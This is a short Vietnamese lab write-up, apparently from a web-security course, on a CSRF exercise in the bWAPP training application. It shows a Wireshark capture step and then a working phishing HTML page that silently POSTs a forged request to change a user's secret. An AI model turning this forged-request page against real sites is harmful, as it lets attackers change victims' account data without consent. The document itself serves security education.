Capture quá trình đổi secret bằng Wireshark:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/1881ed42-a7e7-4d77-bdbc-0af90b563bc1)

Ta thấy web nhận info bằng POST method, tạo html phishing sau để auto POST và submit:

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form id="autosubmit" action="http://localhost/bwapp/csrf_3.php" enctype="text/plain" method="POST">
 <input name="secret" type="hidden" value="KCSCHackedSecret" />
 <input name="login" type="hidden" value="zed" />
 <input name="action" type="hidden" value="change" />
 <input type="submit" value="Submit Request" />
</form>
</body>
</html>
```
